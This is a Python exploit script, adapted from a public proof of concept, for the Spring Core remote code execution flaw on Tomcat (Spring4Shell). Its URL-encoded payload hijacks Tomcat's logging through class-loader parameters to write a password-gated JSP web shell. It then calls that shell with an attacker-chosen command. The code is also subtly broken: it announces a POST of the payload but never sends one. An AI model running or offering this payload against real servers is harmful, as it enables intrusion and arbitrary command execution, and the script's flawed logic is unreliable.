# I found a working poc script from https://github.com/Retrospected/spring-rce-poc thanks to @Retrospected
# I had trimmed down the code and added a command argument

from requests import get, post
import argparse
from urllib.parse import unquote

def Exploit(url,CommandExec):
    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/stupidRumor_war&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    print("\nDissecting payload")
    print(f"\n[+] After url decoding payload: {unquote(data)}")

    try:
        print("\n[+] Post Request is then sent with payload")
        shellurl = f"{url}tomcatwar.jsp?pwd=j&cmd={CommandExec}"
        print(f"\nShellURL is {shellurl}")
        res = get(shellurl,timeout=15,allow_redirects=False, verify=False)
        if res.status_code == 200:
            print(res.text)
    except Exception as e:
        print(e)
        pass

def main():
    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
    parser.add_argument('--url',help='target url',required=False)
    parser.add_argument('--command',help='command',required=False)
    args = parser.parse_args()

    if args.url:
        Exploit(args.url,args.command)

if __name__ == '__main__':
    main()
